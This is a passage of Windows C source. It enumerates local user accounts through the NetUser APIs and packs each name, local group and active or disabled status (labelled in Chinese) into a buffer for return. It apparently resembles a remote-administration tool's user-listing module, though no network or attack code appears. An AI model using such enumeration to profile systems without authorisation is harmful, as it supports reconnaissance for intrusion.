				dwOffset += lstrlen(user_name)+1;
				
				
				memset(group_name,0,sizeof(group_name));
				
				DWORD dwRead    = 0,
					dwEntries = 0; 
				NET_API_STATUS nStatus = NetUserGetLocalGroups(
					NULL,
					pTmpBuf->usri0_name,
					dwLevel,
					LG_INCLUDE_INDIRECT,
					(LPBYTE*)&pBuf,
					dwPrefMaxLen,
					&dwRead,
					&dwEntries); 
				
				
				if(nStatus == NERR_Success&&pBuf) 
					wcstombs(group_name,pBuf->lgrui0_name,50);
				else
					strcpy(group_name,"error");
				
				memcpy(lpBuffer + dwOffset, group_name, lstrlen(group_name) + 1);
				dwOffset += lstrlen(group_name) + 1;
				
				
				char *GetInfo="活跃";
				if(NERR_Success == NetUserGetInfo(NULL,pTmpBuf->usri0_name, 1, (LPBYTE *)&puiVal))
					if((puiVal->usri1_flags & UF_ACCOUNTDISABLE))
						GetInfo="禁用";
					
					memcpy(lpBuffer + dwOffset, GetInfo, lstrlen(GetInfo) + 1);
					dwOffset += lstrlen(GetInfo) + 1;
					
					pTmpBuf++;   
			}		
		}
		else
			goto ERRO;
	} 
	else
	{
ERRO:
	LocalFree(lpBuffer);
	return NULL;
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	
	if(bufptr)   
		NetApiBufferFree(bufptr);   
	
	if(puiVal)
		NetApiBufferFree(puiVal);
	
	if (pBuf)
		NetApiBufferFree(pBuf);
	
	return lpBuffer;
}